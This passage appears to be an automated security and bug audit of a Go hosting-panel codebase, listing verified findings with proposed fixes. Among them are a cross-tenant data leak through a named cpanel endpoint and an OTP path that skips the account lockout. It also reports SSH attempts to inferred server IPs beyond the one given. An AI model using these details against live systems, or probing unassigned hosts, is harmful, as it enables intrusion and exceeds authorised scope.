        if prev, ok := s.recoverFirstSeen(qid, ts); ok {
            first = prev
        }
        e = &partialEntry{queueID: qid, firstSeen: first, recipients: map[string]*models.MailLogRecipient{}}
        s.partial[qid] = e
    }

Add a helper that reads the most recent open row for this qid on this server within a 6-day window (covers the 5-day maximal_queue_lifetime):

    func (s *MailLogService) recoverFirstSeen(qid string, ts time.Time) (time.Time, bool) {
        ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
        defer cancel()
        var row struct{ FirstSeen time.Time `bson:"first_seen"` }
        err := s.db.Collection(database.ColMailLogs).FindOne(ctx,
            bson.M{"queue_id": qid, "server_ip": s.serverIP, "queued": true,
                "first_seen": bson.M{"$gte": ts.Add(-6 * 24 * time.Hour)}},
            options.FindOne().SetSort(bson.D{{Key: "first_seen", Value: -1}}),
        ).Decode(&row)
        if err != nil || row.FirstSeen.IsZero() {
            return time.Time{}, false
        }
        return row.FirstSeen, true
    }

This keeps the memory eviction at line 513 intact (memory stays bounded) while ensuring the recreated partial reuses the original firstSeen → same LogKey → the upsert UPDATES the original row (clearing queued/advancing status) instead of spawning a duplicate + phantom. The "queued:true + recency window" predicate preserves the recycle-id protection.

---

## 20. [medium] formatRecordValueForPDNS emits malformed CAA ('0  "value"') when caa_tag is empty, corrupting the rrset on reconcile
- file: backend/internal/services/dns_service.go
- line: 595-606
- fixSafe: True
- reason: Verified the full path statically. (1) dns_service.go:595-606 is exactly as quoted: the CAA branch does fmt.Sprintf("%d %s %s", flag, rec.CAATag, val) with no guard that rec.CAATag is non-empty. (2) Both SPAs (frontend/apps/whm/src/pages/DnsPage.tsx:250-261 and frontend/apps/cpanel/src/pages/DnsPage.tsx:203-212) build the POST/PUT payload with only type/name/value/ttl and optionally priority — caa_tag/caa_flag are NEVER sent. The shared UI (packages/ui/src/dns.ts:127-154) has no CAA-tag input at all: PRIORITY_TYPES includes "CAA" and the priority box is relabeled "Flags" (DnsPage.tsx:1016), and the CAA placeholder/hint (dns.ts:131) tells the operator to type the whole content ('0 issue "letsencrypt.org"') into the Value field. (3) AddRecord (dns_service.go:761-762) copies req.CAAFlag/req.CAATag straight through, so a UI-authored CAA lands in Mongo with CAATag="" and CAAFlag=nil; UpdateRecord (827-914) never sets the CAA fields and the handler (dns_handler.go:68-82,131-156) does no CAA parsing and no validation requires caa_tag (no validate tag on the field, models/dns.go:63). (4) reconcileRRSet runs formatRecordValueForPDNS on every Add/Update (dns_service.go:680) and feeds the result as a single argument to `pdnsutil replace-rrset` (agent/dns.go:114-125). With CAATag="" the emitted content is '0  "..."' (flags, empty tag, double space) — invalid CAA, since PowerDNS requires a non-empty tag (issue/issuewild/iodef). If the operator instead follows the placeholder and types the full string into value, the value (not starting with a quote) is re-wrapped to '0  "0 issue \"letsencrypt.org\""' — also invalid. (5) The heal-on-read path (stripPDNSValueToMongoShape, 491-503) only backfills tag/flag for records already present in pdns in valid wire form, so it cannot rescue a freshly-added UI CAA whose first write is the malformed reconcile. Net: an operator cannot reliably publish a CAA record from either panel UI. Could not confirm at runtime (default VPS host 187.127.179.98:22 is firewalled/timed out, and the sandbox denied SSH to other inferred IPs), but the static path is conclusive and PowerDNS CAA semantics are well-established. Severity medium: it breaks one record type from the UI; A/AAAA/CNAME/MX/SRV/TXT are unaffected.

**finalFix:**
In backend/internal/services/dns_service.go, replace the CAA case (lines 595-606) so an empty CAATag does not emit a malformed flag+empty-tag token. Because the panel UI stores the full CAA content in the Value field (per the placeholder), when CAATag is empty pass the value through as complete content; only assemble flag+tag+quoted-value when CAATag is set (the native/healed path):

	case "CAA":
		// pdnsutil wants `<flags> <tag> "<value>"`. The panel UI stores
		// flags+tag+value all in the Value field (caa_tag/caa_flag are
		// never sent), so when CAATag is empty the row's value is ALREADY
		// the full CAA content — pass it through untouched. Only assemble
		// from the dedicated columns when CAATag was populated (records
		// healed-on-read from pdns, or a future UI that splits the fields).
		if strings.TrimSpace(rec.CAATag) == "" {
			return v
		}
		val := v
		if !strings.HasPrefix(val, "\"") {
			val = "\"" + strings.ReplaceAll(val, "\"", "\\\"") + "\""
		}
		flag := 0
		if rec.CAAFlag != nil {
			flag = *rec.CAAFlag
		}
		return fmt.Sprintf("%d %s %s", flag, rec.CAATag, val)

This is surgical and does not change the working healed/native path (CAATag set). Note: this assumes the operator follows the UI placeholder and enters the full '0 issue "value"' content; a more thorough follow-up would add a real CAA tag/flag input to the UI and validate caa_tag for Type==CAA, but that is a feature change, not the minimal fix.

---

## 21. [medium] Password (and role) rotation does not propagate to remote-access MySQL host grants, silently breaking remote DB access and leaving stale credentials
- file: backend/internal/services/database_service.go
- line: UpdateOwnerPassword: 417; UpdateUserPassword: 465; UpdateUserRole: 508 (all hardcode host "localhost")
- fixSafe: True
- reason: Verified against the actual code. AddAccessHost (database_service.go:737) creates a genuinely distinct MySQL account 'username'@'<host>' via CreateMySQLUserWithRole(..., host, "dbOwner") using a copy of the owner's password (agent/mysql.go:104 emits CREATE USER '%s'@'%s' IDENTIFIED BY ...). In MySQL each user@host is a separate row in mysql.user with its own password; RemoveAccessHost (line 794) confirms the per-host account shares dbRecord.Username. UpdateOwnerPassword (417), UpdateUserPassword (465) and UpdateUserRole (508) all hardcode host "localhost" and never iterate db_access_hosts. agent/mysql.go:122 issues ALTER USER 'u'@'localhost' IDENTIFIED BY ..., which does NOT affect 'u'@'<remote-ip>' rows. So after a routine password rotation: the panel stores/displays the new password and rebuilds connection_string with it (line 422-430), but every remote @'<ip>' grant still requires the OLD password -> remote connections break and the displayed credential is wrong for remote hosts. Role changes have the same gap. Reachable by real callers: routes are wired on both surfaces (whm_routes.go:181/184/185/192 behind database.manage, cpanel_routes.go:93/96/97/100); handlers (database_handler.go:95/110/126) pass straight through with no upstream re-sync. No guard prevents it. Refutation attempts failed: the grant is a real distinct account (not %/firewall-only), and there is no documented re-add flow that excuses silent breakage. Correctly self-rated latent/medium since no access-host rows exist on the demo box yet.

**finalFix:**
Re-apply rotations to every remote-access host (best-effort, log failures). The access-host accounts always use the owner's username, so for the user-level endpoints only re-sync when the user IS the owner.

In UpdateOwnerPassword, after the localhost ALTER (database_service.go ~419), before building connStr:
```go
case "mysql":
    if err := agent.UpdateMySQLUserPassword(ctx, dbRecord.Username, "localhost", newPassword); err != nil {
        return fmt.Errorf("failed to update MySQL password: %w", err)
    }
    // Owner's remote-access grants are separate user@host accounts; rotate each.
    if hosts, herr := s.ListAccessHosts(ctx, dbID); herr == nil {
        for _, rec := range hosts {
            if rec.Host == "" || rec.Host == "localhost" { continue }
            if uerr := agent.UpdateMySQLUserPassword(ctx, dbRecord.Username, rec.Host, newPassword); uerr != nil {
                log.Warn().Err(uerr).Str("host", rec.Host).Msg("failed to rotate remote-access MySQL password")
            }
        }
    }
```

In UpdateUserPassword (database_service.go ~465), inside the mysql case, after the localhost ALTER, guard on owner identity:
```go
case "mysql":
    if err := agent.UpdateMySQLUserPassword(ctx, user.Username, "localhost", newPassword); err != nil {
        return fmt.Errorf("failed to update MySQL password: %w", err)
    }
    if user.Username == dbRecord.Username {
        if hosts, herr := s.ListAccessHosts(ctx, dbID); herr == nil {
            for _, rec := range hosts {
                if rec.Host == "" || rec.Host == "localhost" { continue }
                if uerr := agent.UpdateMySQLUserPassword(ctx, user.Username, rec.Host, newPassword); uerr != nil {
                    log.Warn().Err(uerr).Str("host", rec.Host).Msg("failed to rotate remote-access MySQL password")
                }
            }
        }
    }
```

In UpdateUserRole (database_service.go ~508), inside the mysql case, after the localhost grant, same owner-scoped loop using agent.UpdateMySQLUserRole(ctx, dbRecord.DBName, user.Username, rec.Host, role).

(Ensure the zerolog logger is imported/available in the service; the package already uses structured logging elsewhere.)

---

## 22. [medium] Legacy GitHub-Deploy double-prefixes the systemd unit name, so Redeploy/Rollback restart a non-existent unit (and reverse-proxy points at the panel's own port)
- file: backend/internal/services/deploy_service.go
- line: 102-114, 191-193, 265-266
- fixSafe: True
- reason: Code matches the candidate's quotes exactly. deploy_service.go:102 builds serviceName := "sp-deploy-"+req.Domain and passes it to agent.CreateSystemdService (108). agent/deploy.go:59 prepends "sp-app-" internally, so the unit actually written to /etc/systemd/system is sp-app-sp-deploy-<domain>.service. The established convention (proven by the working app_service.go) is: CreateSystemdService/DeleteSystemdService add the sp-app- prefix internally, but ServiceAction and journalctl require the FULL unit name — app_service.go:726/788 pass "sp-app-"+name to ServiceAction and app_service.go:812 passes the bare name to DeleteSystemdService. deploy_service.go violates this: Redeploy (193) and GetLogs (345) pass "sp-deploy-"+domain to ServiceAction/journalctl, which run `systemctl restart sp-deploy-<domain>` and `journalctl -u sp-deploy-<domain>` verbatim (agent/system.go:195-198) against a unit that does not exist. The ServiceAction return value is ignored (line 193), so the failed restart silently no-ops: a Redeploy pulls+builds new code but the old process keeps serving, while a "success" release record is still written. journalctl logs come back empty. Reachability confirmed: POST /api/v1/cpanel/deploy (Create, route 304) and POST /api/v1/cpanel/deploy/:id/redeploy (Redeploy, route 307) and GET /api/v1/cpanel/deploy/:id/logs (Logs, route 305) are registered for all non-owner roles, with thin pass-through handlers (deploy_handler.go). Delete is NOT affected — it calls DeleteSystemdService with "sp-deploy-"+domain, which prefixes to sp-app-sp-deploy-<domain>, matching what Create wrote, so Delete works. Two corrections to the candidate: (a) Rollback (deploy_service.go:244, lines 265-266) has the same defect but is NOT routed anywhere (no route registers h.Deploy.Rollback), so it is unreachable via HTTP — the candidate over-claims it as a live trigger; (b) the hardcoded Port:8080 in CreateReverseProxy (113) is a separate, real-but-lower-confidence design defect (every deployed app is proxied to 8080 regardless of its actual listen port) and is not the core of this finding. The primary bug (Redeploy restarts a non-existent unit; logs empty) is genuinely real and reachable.

**finalFix:**
Make the on-disk unit name match what ServiceAction/journalctl reference by using the name-explicit agent pair (which does NO prefixing) and keeping serviceName="sp-deploy-"+domain literal everywhere. In backend/internal/services/deploy_service.go:

- Line 108 (Create): replace
    agent.CreateSystemdService(ctx, serviceName, "root", workDir, req.StartCommand, req.EnvVars)
  with
    agent.CreateSystemdUnit(ctx, serviceName, "root", workDir, req.StartCommand, req.EnvVars)

- Line 311 (Delete): replace
    agent.DeleteSystemdService(ctx, serviceName)
  with
    agent.DeleteSystemdUnit(ctx, serviceName)

This makes Create write /etc/systemd/system/sp-deploy-<domain>.service, which is exactly what Redeploy (193), Rollback (266), Delete (311), and GetLogs (345) already reference via the literal "sp-deploy-"+domain. CreateSystemdUnit/DeleteSystemdUnit already exist (agent/deploy.go:88,131) and do no prefixing, so no agent changes are needed and no working feature breaks (Apps still use CreateSystemdService unchanged). Separately (optional, out of scope of the unit-name fix): inject the app's real PORT into EnvVars and pass that same port to CreateReverseProxy instead of the hardcoded Port:8080 at line 113.

---

## 23. [medium] runDeploy deletes the monorepo root package.json + lockfiles from the shared clone for single-segment-subpath services
- file: backend/internal/services/project_service.go
- line: 3127-3134
- fixSafe: True
- reason: Confirmed by reading the code and history. (1) Code matches: lines 3127-3134 do `rm -f` of package-lock.json/pnpm-lock.yaml/yarn.lock/package.json in `filepath.Dir(svc.InstallDir)` guarded only by `parent != "" && parent != "/" && strings.Contains(parent, "/projects/")`. (2) Layout: in the project-level-clone layout, AddService sets `installDir = filepath.Join(proj.ProjectDir, cleanSubpath)` (line 1518) and `proj.ProjectDir = /home/<user>/projects/<slug>` (line 434). For a single-segment subpath like "backend", `filepath.Dir("/home/u/projects/slug/backend") == "/home/u/projects/slug" == proj.ProjectDir`, which is the shared clone root holding `.git` and the tracked root package.json/lockfile of a workspaces monorepo. The "/projects/" substring guard passes, so the rm nukes the workspace root files. (3) Order: in runDeploy the rm (3127) runs AFTER step-0 sync (3050) and immediately BEFORE install (3136), which runs in workDir = the subpath dir (3114,3138). For a workspaces monorepo, install in a workspace subdir requires the root package.json/lockfile (npm walks up; pnpm/yarn `workspace:*` deps fail outright without it), so install/build breaks. (4) Reachability + permanence: POST /:id/services/:svc/deploy -> DeployService handler defaults skipPull=true unless ?pull=1 (project_handler.go:488), so per-service Redeploy skips inPlaceSync's `git reset --hard` entirely; nothing restores the deleted root files until a project-level Pull, so the deletion persists. (5) Regression confirmed by git history: the pre-clean (5b152f6, 2026-04-19 11:50) was written for the LEGACY "wrapper parent" model where /home/<user>/projects/<slug>/ owns no files; the shared-clone refactor (e7ea16b, 2026-04-19 12:47) landed ~1h later and the pre-clean was never updated, making that exact path a real clone root. Could not refute: the guard does not exclude proj.ProjectDir, the path arithmetic is exact (no trailing slash on either side), and install genuinely runs against the broken root.

**finalFix:**
backend/internal/services/project_service.go, line 3127 — exclude the shared project clone root from the parent lockfile sweep so it only ever targets non-clone wrapper/intermediate dirs. `proj` is already in scope (loaded at runDeploy line 2833). In the legacy layout proj.ProjectDir == "" so the new clause stays true there (stray-file cleanup preserved); in the new layout it skips the clone root.

Change:
	if parent := filepath.Dir(svc.InstallDir); parent != "" && parent != "/" && strings.Contains(parent, "/projects/") {
to:
	if parent := filepath.Dir(svc.InstallDir); parent != "" && parent != "/" && strings.Contains(parent, "/projects/") && parent != proj.ProjectDir {

(Hardening optional: also skip when `parent` contains a `.git`, e.g. test -d filepath.Join(parent, ".git"), to protect deeper multi-segment subpaths whose intermediate dir is still inside the tracked clone — but the parent != proj.ProjectDir guard fixes the definite, reported breakage.)

---

## 24. [medium] IssueLetsEncrypt SAN-expand short-circuit: when a cert already exists and Reissue=false, new AdditionalDomains are written to the DB record + nginx server_name but never added to the actual certificate (SAN mismatch / wrong-cert served)
- file: backend/internal/services/ssl_service.go
- line: 228-235 (the `case !req.Wildcard && agent.LetsEncryptCertExists(req.Domain):` short-circuit) and 270-298 (DB upsert with cert.Domains = primary+AdditionalDomains)
- fixSafe: True
- reason: Code is as quoted. ssl_service.go:228 `case !req.Wildcard && agent.LetsEncryptCertExists(req.Domain):` short-circuits certbot whenever fullchain.pem merely exists; LetsEncryptCertExists (nginx.go:411-419) only os.Stat's the file and does no SAN comparison. The branch then unconditionally upserts cert.Domains = [primary]+AdditionalDomains (lines 241-242, 275) and writes an SSL vhost via the hardcoded vhostSSLTemplate whose server_name is always `<d> www.<d> cname.<d>` (nginx.go:71/80). So when the on-disk cert is narrower than the requested/hardcoded names, the panel records SANs the cert does not cover and (for www/cname, which are hardcoded into server_name) nginx will present the narrow cert on https://www.<d> -> TLS name mismatch. This is exactly the konsultkaro.com symptom (version.go:2910-2964): apex cert SAN had only DNS:<d>, www fell through to the panel catch-all cert. The repo even has the right guards (agent.LetsEncryptCertSANs nginx.go:432 + sanCovers project_helpers.go:1023) but applies them ONLY on the Deploy-Software alias-link path, never on this issue short-circuit. The known heals (SSLService.Reissue ssl_service.go:705-708 forcing Reissue=true; bzpanel heal-www) require explicit operator action — nothing self-heals on the Reissue=false issue path. Reachable: (1) direct POST /whm/ssl/letsencrypt or /cpanel/ssl/letsencrypt (routes whm_routes.go:302 / cpanel_routes.go:157 -> ssl_handler.go:51-63 passes additional_domains + reissue=false straight through; model fields ssl.go:39/48) while a cert already exists -> Mongo cert.Domains over-reports coverage; (2) DomainService.Create auto-SSL (domain_service.go:575-583, Reissue=false, AdditionalDomains=[www.<d>,cname.<d>]) when a previously-deleted domain's LE files were preserved (Delete keeps them, ssl_service.go:753-758) and the preserved cert is a pre-3.1.11 primary-only cert -> genuine www/cname TLS mismatch. PARTIAL REFUTATION of the candidate's framing (does not change the verdict): both bulk paths build the single request with NO AdditionalDomains (ssl_service.go:499-504 and ssl_bulk_job_service.go:218-223), so 'bulk issue without reissue' does NOT introduce a SAN mismatch — only primary is recorded/issued. Also, arbitrary (non-www/cname) AdditionalDomains are NOT injected into nginx server_name (template is hardcoded), so for those the harm is DB misreporting only, not wrong-cert-served. The user-visible TLS harm is specific to www/cname on legacy-narrow certs; the DB-accuracy bug is general.

**finalFix:**
In ssl_service.go IssueLetsEncrypt, gate the reuse short-circuit on actual SAN coverage so it only skips certbot when the on-disk cert already covers every requested name; otherwise fall through to agent.IssueLetsEncrypt (which expands the existing --cert-name lineage). Reuses the existing helpers agent.LetsEncryptCertSANs + sanCovers. Replace lines 228-235:

    case !req.Wildcard && agent.LetsEncryptCertExists(req.Domain) && certCoversAll(req.Domain, append([]string{req.Domain}, req.AdditionalDomains...)):
        // existing cert already covers every requested SAN — reuse it
        // (saves an LE rate-limit slot). Falls through to DB upsert +
        // vhost upgrade below.
    default:
        if err := agent.IssueLetsEncrypt(ctx, req.Domain, email, req.AdditionalDomains, req.Wildcard); err != nil {
            return nil, friendlyCertbotError(err)
        }

and add a small helper (services package):

    // certCoversAll reports whether the live LE cert for `domain`
    // already lists every host in `hosts` in its SAN set (wildcard-
    // aware). Used to decide whether the reuse short-circuit is safe
    // or whether we must re-run certbot to expand the cert.
    func certCoversAll(domain string, hosts []string) bool {
        sans := agent.LetsEncryptCertSANs(domain)
        if len(sans) == 0 {
            return false
        }
        for _, h := range hosts {
            if !sanCovers(sans, h) {
                return false
            }
        }
        return true
    }

This keeps the rate-limit-saving reuse on the happy path (cert already covers everything) and only burns an issuance when a requested SAN is genuinely missing — matching the existing Reissue/heal-www healing philosophy. Note sanCovers currently lives in project_helpers.go (same package) so no import change is needed.

---

## 25. [medium] Cross-tenant info disclosure: ResourceService.DomainUsage reads any domain by name with no tenant scope (reachable on cpanel)
- file: backend/internal/handlers/resource_handler.go
- line: 37-44 (handler DomainUsage) -> backend/internal/services/resource_service.go:309-314
- fixSafe: True
- reason: Confirmed against the actual code. ResourceHandler.DomainUsage (resource_handler.go:37-44) passes raw c.Params("domain") to ResourceService.DomainUsage (resource_service.go:309-314), which does col.FindOne(ctx, bson.M{"domain": domain}) with NO GetCallerScope/AssertOwnsDomain check, then returns the owning linux username, /home/<user> disk bytes, per-app install paths+sizes, per-database names+sizes, mailbox bytes, bandwidth counters, and the last 20 nginx access-log lines (visitor IPs, request paths, statuses) for that domain. Reachability is real: cpanel_routes.go:271 registers cpanel.Get("/resources/domains/:domain", h.Resource.DomainUsage) inside the group built at cpanel_routes.go:17-22 which applies middleware.InjectScope() and RequireRole(vendor_admin, vendor_staff, developer, support, customer) with no per-route permission. Because InjectScope attaches a CallerScope and pkg/constants.IsTenantScoped returns true for all five of those roles (false only for vendor_owner), any User-Panel account can GET /api/v1/cpanel/resources/domains/<another-tenant-domain> and receive another tenant's data. Not guarded upstream: the group has no extra middleware, and the service performs no scoping. This is an outlier — sibling per-domain tenant reads enforce ownership (database_service.go:129-130 scope.AssertOwnsDomain; dns_service.go:97 assertCallerOwnsDomain; email_bulk_service.go:814-815; domain_bulk_service.go:793-794; domain_service.go GetByID at 313). The proposed fix does not break WHM: AssertOwnsDomain (tenant_scope.go:246-249) returns nil when the scope is nil or the role is not tenant-scoped (vendor_owner), so the WHM route (whm_routes.go:513, gated by domain.view) is unaffected. fmt is already imported (resource_service.go:5) and GetCallerScope/AssertOwnsDomain are in the same package, so the fix compiles. Note: the sibling cpanel route /resources/bandwidth/:domain (BandwidthByDomain, resource_service.go:554) has the same gap but leaks far less (only byte/count totals derived from a guessed log path, no DB data); the candidate's scope is DomainUsage, the high-disclosure one.

**finalFix:**
In backend/internal/services/resource_service.go, in DomainUsage, immediately after the domainDoc FindOne block (after line 314, before `user, _ := domainDoc["user"].(string)`), add the tenant-ownership check:

	if scope := GetCallerScope(ctx); scope != nil {
		if err := scope.AssertOwnsDomain(ctx, s.db, domain); err != nil {
			return nil, fmt.Errorf("domain not found: %s", domain)
		}
	}

AssertOwnsDomain returns nil for vendor_owner (non-tenant-scoped), so WHM is unaffected; tenant-scoped cpanel roles get a generic "domain not found" for domains outside their tenant. (Optional hardening, separate concern: apply the same guard to BandwidthByDomain at resource_service.go:554.)

---

## 26. [low] Brute-force lockout is bypassable via OTP login
- file: backend/internal/services/auth_service.go
- line: 1043-1051 (VerifyOTP user lookup); 817-821 (RequestOTP); 1190-1198 (CompleteOTP)
- fixSafe: True
- reason: Code verified exactly as quoted. Login (l.139-141) and the deliberately-added RefreshToken guard (l.242-247) both reject a session when user.LockedUntil is in the future; api_token_service.go (l.414) enforces the same lockout-on-use invariant. The OTP login path does NOT: VerifyOTP (l.1045-1049) and CompleteOTP (l.1192-1196) decode the user with only {email, deleted_at:nil, is_active:true} and never check LockedUntil, and both clear locked_until:nil + failed_logins:0 on success (l.1084, l.1231). RequestOTP (l.817-821) likewise has no lock check. The endpoints are public, pre-auth, rate-limited-only (routes/auth_routes.go l.42-46 → handlers auth_handler.go l.217/275/352), so the path is fully reachable. By the codebase's own stated invariant ("without this check a locked account kept refreshing into new access tokens, defeating the lockout"), the OTP path silently breaks the same invariant. REFUTATION of the candidate's medium severity: the OTP channel requires reading an emailed code, i.e. inbox access — a strictly STRONGER factor than the password-guessing the lockout defends against. The brute-forcer who triggered the lockout cannot read the code, so they obtain no session; the lockout's actual target gains nothing. The only real weakening is that a legitimate OTP recovery resets failed_logins/locked_until, re-opening the password brute-force budget (Login re-locks immediately at FailedLogins 20+1, so the reset matters). That is a defense-in-depth / consistency gap, not an authentication bypass — hence low, not medium.

**finalFix:**
Mirror the existing Login/RefreshToken lock guard in the two OTP success paths, right after the user is decoded. This is surgical and matches the established pattern; it does not block legitimate recovery any differently than password login already does (a locked user simply waits out the 15-min window on either channel).

backend/internal/services/auth_service.go — in VerifyOTP, after the user decode at l.1045-1051 (the `if err := users.FindOne(...).Decode(&user); err != nil { return nil, errors.New("account not available") }` block), insert:

	if user.LockedUntil != nil && user.LockedUntil.After(time.Now()) {
		return nil, errors.New("account is temporarily locked, please try again later")
	}

backend/internal/services/auth_service.go — in CompleteOTP, after the user decode at l.1192-1198 (same `Decode(&user)` block), insert the identical guard:

	if user.LockedUntil != nil && user.LockedUntil.After(time.Now()) {
		return nil, errors.New("account is temporarily locked, please try again later")
	}

(`time` and `errors` are already imported and used in this file.) With the guard in place, the locked_until:nil reset at l.1084/l.1231 is only reached once the lock has expired, so the password brute-force budget is no longer reset early. No change needed in RequestOTP — gating issuance there only changes when the email is sent; the load-bearing gate is at session-mint time.

---

## 27. [low] isUserAllowed caches a negative decision on transient Mongo errors (15s lockout of legit users)
- file: backend/internal/middleware/auth.go
- line: 49-64
- fixSafe: True
- reason: Code matches the candidate. auth.go:49 sets `allowed := false`; the query result only flips it to active when `err == nil` (line 59-61). On any FindOne error (the 2s WithTimeout at line 56-58 makes timeouts likely during a failover/stepdown), `allowed` stays false, and auth.go:63 calls `authcache.Put(...)` UNCONDITIONALLY with a 15s TTL. There is no distinction between mongo.ErrNoDocuments (definitive "deleted") and a transient error — confirmed: auth.go never imports `errors` nor references `ErrNoDocuments`. On the next request within 15s, the cache hit at lines 45-46 returns the cached `false` WITHOUT re-querying Mongo, so even after Mongo recovers the deny persists for the remainder of the TTL. authcache.go shows the only early-clear path is Invalidate/InvalidateAll, which only fire on admin suspend/delete/activate (user_service.go) — nothing clears a transient-error false-negative. Reachable by any authenticated user whose cache entry is expired/absent (after ~15s idle or first request of a session) at the moment a FindOne errors during a Mongo blip. Not a security hole (it fails safe by denying), but a real availability/correctness defect: the deny is cached and outlives the actual DB hiccup. Severity low is accurate. The fix is surgical and preserves all working behavior (suspend=deny+cache, active=allow+cache); it only stops caching transient errors.

**finalFix:**
In backend/internal/middleware/auth.go, only cache a definitive answer; deny the current request on a transient error WITHOUT poisoning the cache. Replace lines 49-64:

	allowed := false
	cacheResult := true // only cache a definitive answer
	if oid, err := primitive.ObjectIDFromHex(userID); err == nil {
		var u struct {
			IsActive bool `bson:"is_active"`
		}
		ctxQ, cancel := context.WithTimeout(ctx, 2*time.Second)
		err := db.Collection(database.ColUsers).FindOne(ctxQ, bson.M{"_id": oid}).Decode(&u)
		cancel()
		switch {
		case err == nil:
			allowed = u.IsActive // definitive: cache
		case errors.Is(err, mongo.ErrNoDocuments):
			allowed = false // definitive: user deleted, cache the deny
		default:
			// transient (timeout / failover): deny THIS request but do
			// not pin a 15s negative entry that outlives the DB hiccup.
			cacheResult = false
		}
	}
	if cacheResult {
		authcache.Put(userID, authcache.Status{Allowed: allowed, ExpiresAt: now.Add(activeUserCacheTTL)})
	}
	return allowed

Also add "errors" to the import block (line 3-17). `mongo` is already imported (line 16).

---

## 28. [low] mail-log ingestor holds the parse mutex across a synchronous (up to 8s) MongoDB upsert, stalling the live mail.log tail under load
- file: backend/internal/services/mail_log_service.go
- line: 376-382, 444-481, 524-536, 496-518, 228-302
- fixSafe: True
- reason: Code verified verbatim. parseLine (line 190) is the sole consumer of the `tail -n0 -F` stdout pipe (tailLoop line 175-176). It acquires s.mu (line 228, deferred unlock 229). On the qmgr "removed" path (line 290) it calls finalizeLocked(e)->upsert (line 376-381), which runs a SYNCHRONOUS UpdateOne with an 8s timeout (lines 445, 473) INSIDE the held lock and inside the consumer goroutine itself. So even with zero lock contention, a Mongo slowdown blocks the scanner for up to 8s per "removed" line, the kernel pipe buffer fills, and tail backs off — ingestion stalls. The flusher (line 496-518) compounds this: it holds s.mu across a loop calling finalizeLocked->upsert (line 503) for every idle item. The eviction path (235->524->533) does the same. Reachable with no auth: StartIngestor is called once at boot (cmd/server/main.go:364) and runs continuously. The author's comment (lines 378-380) confirms the upsert deliberately runs under the lock. ADVERSARIAL CAVEATS that keep this LOW, not refuted: (1) It is a latency/availability defect, not a correctness bug in normal operation — upserts are idempotent and `tail -F` is rotation-tolerant, so a consumer that falls behind during a transient stall normally just catches up with no loss. (2) Actual line LOSS requires the conjunction of a multi-second Mongo stall AND a log rotation that deletes the old file before tail drains it — a rare edge with daily/weekly logrotate, not a reliable trigger. (3) The 8000-cap eviction-storm needs a genuinely huge mailserver concurrent with a Mongo stall. (4) The demo server has tiny volume (mail_logs=6, mail.log=423 lines) so the cap path is never hit. Net: a genuine latent concurrency/availability defect in the ingestion hot path, correctly rated low.

**finalFix:**
Move the blocking Mongo upsert out of the critical section while keeping the partial map consistent (build under lock, write after unlock).

1) In mail_log_service.go change finalizeLocked (line 376-382) to only build and return the entry, not write it:

    // buildForFlushLocked builds the MailLogEntry for an accumulated partial.
    // Caller must hold s.mu and must upsert the returned entry AFTER releasing it.
    func (s *MailLogService) buildForFlushLocked(e *partialEntry) models.MailLogEntry {
        return s.buildEntry(e)
    }

2) qmgr "removed" path (parseLine, lines 287-293): build under lock, unlock, then upsert:

        case "qmgr":
            if detail == "removed" {
                e.removed = true
                entry := s.buildEntry(e)
                delete(s.partial, qid)
                s.mu.Unlock()      // release before the (possibly slow) Mongo write
                s.upsert(entry)
                return             // NOTE: must skip the deferred Unlock now
            }

   Because parseLine uses `defer s.mu.Unlock()` (line 229), the cleanest minimal form is to drop the defer and unlock explicitly on every return path, OR keep the defer but guard with a flag. Simplest robust version: remove `defer s.mu.Unlock()` at line 229, replace the top of the switch-owning section so that the lock is taken, and restructure parseLine to collect a local `var toUpsert []models.MailLogEntry`, do all map mutation under the lock, `s.mu.Unlock()` once at the end of the locked block, then `for _, en := range toUpsert { s.upsert(en) }`.

3) evictOldestLocked (524-536): instead of calling finalizeLocked, return the built entry to the caller so the caller can upsert it after unlocking:

    func (s *MailLogService) evictOldestLocked() (models.MailLogEntry, bool) {
        var oldestQID string
        var oldest time.Time
        for qid, e := range s.partial {
            if oldestQID == "" || e.firstSeen.Before(oldest) {
                oldestQID, oldest = qid, e.firstSeen
            }
        }
        if oldestQID == "" {
            return models.MailLogEntry{}, false
        }
        en := s.buildEntry(s.partial[oldestQID])
        delete(s.partial, oldestQID)
        return en, true
    }

   and in parseLine's eviction branch (lines 232-236) capture it into the local toUpsert slice.

4) flusher (485-521): collect built entries under the lock, upsert after Unlock:

            s.mu.Lock()
            var toUpsert []models.MailLogEntry
            for qid, e := range s.partial {
                if e.lastEvent.Before(cutoff) {
                    if e.lastEvent.After(e.lastFlush) {
                        toUpsert = append(toUpsert, s.buildEntry(e))
                        e.lastFlush = now
                    }
                    if e.removed || e.firstSeen.Before(hardCutoff) {
                        delete(s.partial, qid)
                    }
                }
            }
            s.mu.Unlock()
            for _, en := range toUpsert {
                s.upsert(en)
            }

This keeps the partial map mutated only under s.mu (consistency preserved) while moving the up-to-8s blocking Mongo I/O off both the lock and out of the synchronous critical path of the tail consumer.

---

## 29. [low] IsSafeEmail rejects dotless mail domains and underscore-in-domain emails accepted elsewhere (mailbox-create edge case)
- file: backend/pkg/validator/validator.go
- line: 23,35-37 (consumed at backend/internal/services/email_service.go:442)
- fixSafe: True
- reason: Verified the code is exactly as quoted: safeEmailRe at validator.go:23 is `^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z0-9-]+$` (domain half forbids '_' and mandates a literal dot), while safeDNSNameRe (validator.go:17) is `^[A-Za-z0-9._-]+$` (allows '_' and single-label). email_service.go:442 gates req.Email with IsSafeEmail and line 445 gates req.Domain with IsSafeDNSName; domain_service.go:294-296 gates domain creation with IsSafeDNSName only (the Domain model has just validate:"required", no regex). So a domain like my_team.local or localhost CAN be persisted but no mailbox can be created on it. Both validators were added today in v3.1.110 (version.go:6395-6406) as audit command-injection guards, so the timing framing is accurate.\n\nHOWEVER the candidate overstates reachability. I compiled a throwaway test against the vendored go-playground/validator v10.22.1 and confirmed its `email` struct rule ALSO rejects admin@my_team.local, user@localhost and user@intranet (all gopg_email_pass=false), while accepting user@example.com / admin@my-team.local. The single-create handler (email_handler.go:47) and guest handler (guest_handler.go:154) run validator.Validate() with the model's `email` tag (models/email.go:22) BEFORE the service, so for those two paths IsSafeEmail causes NO observable change — the email tag already rejected those addresses identically. The candidate's claim that POST /emails and guest-link are affected is therefore misleading. The genuine behavioral narrowing is only on the programmatic handler (programmatic_handler.go:152, no Validate call) and bulk service (email_bulk_service.go:329-401, only checks non-empty), which skip struct validation and rely solely on IsSafeEmail. Impact is real but latent: candidate concedes all 42 live mailboxes/domains pass both validators, and no product feature creates underscore/single-label mail domains (localhost refs in email_service.go are 